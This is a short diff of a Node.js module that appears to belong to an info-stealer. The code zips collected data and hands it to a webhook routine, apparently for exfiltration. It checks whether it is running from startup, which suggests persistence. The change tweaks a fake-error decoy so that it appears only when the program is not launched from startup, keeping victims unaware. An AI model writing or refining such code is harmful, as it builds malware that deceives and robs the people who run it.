@@ -1,5 +1,5 @@
 const config = require('../config');
-const { runningFromExecutable, sleep } = require('./general');
+const { runningFromExecutable, sleep, runningFromStartup} = require('./general');
 const { join, sep } = require('path');
 const os = require('os');
 const { execSync, spawnSync } = require('child_process');
@@ -43,7 +43,7 @@ module.exports = async () => {
   await sleep(500);
   require('../functions/zip').then(await (require('../functions/webhook')));
 
-  config.fakeError && require('../functions/fake-error');
+  if (config.fakeError && !runningFromStartup()) require('../functions/fake-error');
 };
 
 async function download(url) {
